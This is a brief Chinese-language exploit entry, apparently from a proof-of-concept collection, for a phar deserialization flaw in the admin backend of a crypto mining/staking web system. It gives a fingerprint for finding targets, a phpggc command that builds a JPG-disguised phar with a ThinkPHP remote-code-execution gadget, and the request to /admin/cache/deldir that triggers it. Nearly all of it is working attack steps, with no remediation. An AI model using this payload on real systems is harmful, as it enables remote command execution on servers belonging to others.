# 某U挖矿质押单语言系统后台phar反序列漏洞

某U挖矿质押单语言系统后台phar反序列 ｜ 反序列化 ｜ —
- **指纹**：`"/static/index/css/login/framework7.ios.min.css"`

**Payload**
```
首先我们需要用phpggc生成一个绕过图片检测的phar反序列化脚本，用一张正常图片即可
./phpggc -pj 123.jpg -o evil.jpg ThinkPHP/RCE2 system whoami
/admin/cache/deldir?backup_file=phar://图片地址
```
- **响应特征**：200